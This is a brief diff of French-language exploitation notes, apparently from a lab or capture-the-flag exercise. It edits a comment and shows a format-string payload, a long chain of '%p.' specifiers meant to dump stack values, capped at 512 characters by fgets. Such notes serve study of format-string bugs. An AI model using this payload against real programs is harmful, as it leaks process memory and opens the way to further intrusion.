@@ -35,7 +35,7 @@ Result:
 
 ================================================================================
 
-Payload pour voir toutes la stack au dela il n'affiche plus d'address:
+Payload pour voir la stack ( limiter a 512 char a cause du fgets:
 
 %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
 %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
